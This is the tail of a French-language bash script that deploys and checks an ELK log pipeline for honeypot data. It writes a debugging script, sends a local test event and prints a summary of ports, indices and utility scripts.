echo "   Elasticsearch: $(systemctl is-active elasticsearch)"
echo "   Logstash: $(systemctl is-active logstash)"
echo "   Kibana: $(systemctl is-active kibana)"
echo ""

echo "2. FICHIERS CONFIGURATION:"
ls -la /etc/logstash/conf.d/
echo ""

echo "3. LOGS ERREURS RÉCENTS:"
echo "   Logstash:"
journalctl -u logstash --no-pager -n 5 | grep -i error || echo "   Pas d'erreurs récentes"
echo ""

echo "4. TEST SYNTAXE:"
sudo -u logstash /usr/share/logstash/bin/logstash --path.settings /etc/logstash -t && echo "   ✅ Syntaxe OK" || echo "   ❌ Erreur syntaxe"
echo ""

echo "5. CONNEXIONS RÉSEAU:"
netstat -tlnp | grep -E ":504[46]|:9200|:5601"
echo ""

echo "6. PROCESSUS LOGSTASH:"
ps aux | grep logstash | grep -v grep
echo ""

echo "7. ESPACE DISQUE:"
df -h /var/lib/elasticsearch
echo ""

echo "8. MÉMOIRE:"
free -h
echo ""

echo "9. TEST CONNECTIVITÉ ELASTICSEARCH:"
curl -s "http://192.168.2.124:9200/_cluster/health" | jq . || echo "   Elasticsearch non accessible"
echo ""

echo "10. DERNIERS ÉVÉNEMENTS INDEXÉS:"
curl -s "http://192.168.2.124:9200/honeypot-*/_search?size=3&sort=@timestamp:desc&_source=@timestamp,honeypot_type,detection_method" | jq -r '.hits.hits[]._source | "\(.@timestamp) - \(.honeypot_type) - \(.detection_method)"' 2>/dev/null || echo "   Aucun événement récent"
DEBUG_EOF

chmod +x /opt/debug_honeypot_pipeline.sh

print_status "✅ Scripts de test et monitoring créés"

# ================================
# 10. TEST INITIAL
# ================================
print_status "10. Test initial du pipeline amélioré..."

# Test de base
echo '{"eventid":"cowrie.session.connect","src_ip":"192.168.1.200","timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","message":"Test initial"}' | nc -w 3 localhost 5046 2>/dev/null && print_status "✅ Test TCP envoyé" || print_warning "⚠️ Test TCP échoué"

# Attendre et vérifier
sleep 5
TEST_COUNT=$(curl -s "http://192.168.2.124:9200/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
if [ "$TEST_COUNT" -gt 0 ]; then
    print_status "🎉 $TEST_COUNT documents indexés - Pipeline fonctionnel !"
else
    print_warning "⚠️ Aucun document indexé encore (normal, attendre quelques minutes)"
fi

# ================================
# 11. RÉSUMÉ FINAL AMÉLIORÉ
# ================================
echo ""
print_status "=== PIPELINE HONEYPOT AMÉLIORÉ DÉPLOYÉ AVEC SUCCÈS ==="
echo ""
print_info "🎯 AMÉLIORATIONS APPORTÉES À VOTRE SCRIPT:"
echo "   ✅ Input Beats ajouté (port 5044) pour Filebeat"
echo "   ✅ Gestion d'erreurs JSON robuste"
echo "   ✅ GeoIP amélioré (exclusion IPs privées)"
echo "   ✅ Templates Elasticsearch dans outputs"
echo "   ✅ Métadonnées temporelles ajoutées"
echo "   ✅ Index pour alertes critiques"
echo "   ✅ Scripts de monitoring étendus"
echo ""
print_info "🔧 VOTRE LOGIQUE EXCELLENTE CONSERVÉE:"
echo "   ✅ Détection intelligente Cowrie (eventid pattern)"
echo "   ✅ Détection HTTP native (attack_id + attack_type)"
echo "   ✅ Classification MITRE ATT&CK complète"
echo "   ✅ Scoring dynamique 0-10"
echo "   ✅ Analyse commandes et paths suspects"
echo "   ✅ Détection User-Agent et scanners"
echo ""
print_info "🚀 NOUVEAUX PORTS EN ÉCOUTE:"
echo "   • 5046 (TCP) : Votre sender actuel"
echo "   • 5044 (Beats) : Pour Filebeat étape 6"
echo ""
print_info "📊 INDICES ELASTICSEARCH:"
echo "   • honeypot-cowrie-YYYY.MM.dd"
echo "   • honeypot-http-YYYY.MM.dd"
echo "   • honeypot-ftp-YYYY.MM.dd"
echo "   • honeypot-errors-YYYY.MM.dd (nouveau)"
echo "   • honeypot-critical-alerts-YYYY.MM.dd (nouveau)"
echo ""
print_info "🔧 SCRIPTS UTILITAIRES AMÉLIORÉS:"
echo "   • /opt/test_honeypot_improved.sh (tests complets)"
echo "   • /opt/monitor_honeypot_improved.sh (monitoring avancé)"
echo "   • /opt/debug_honeypot_pipeline.sh (dépannage)"
echo ""
print_warning "🎯 ÉTAPE 5.5 TERMINÉE AVEC EXCELLENCE !"
print_warning "Votre script était déjà excellent, nous l'avons juste rendu parfait !"
echo ""
print_info "🚀 PROCHAINES ÉTAPES :"
echo "1. Tester : /opt/test_honeypot_improved.sh"
echo "2. Monitorer : /opt/monitor_honeypot_improved.sh"
echo "3. Étape 5.6 : Configuration dashboards Kibana"
echo ""
print_status "🎉 PIPELINE HONEYPOT AMÉLIORÉ PARFAITEMENT OPÉRATIONNEL !"

# Log final
echo "$(date): Pipeline honeypot amélioré (5.5) déployé avec succès" >> /var/log/elk-setup/install.log
echo "   - Backup: $BACKUP_DIR" >> /var/log/elk-setup/install.log
echo "   - Input Beats ajouté" >> /var/log/elk-setup/install.log
echo "   - Gestion erreurs améliorée" >> /var/log/elk-setup/install.log
echo "   - Scripts monitoring étendus" >> /var/log/elk-setup/install.log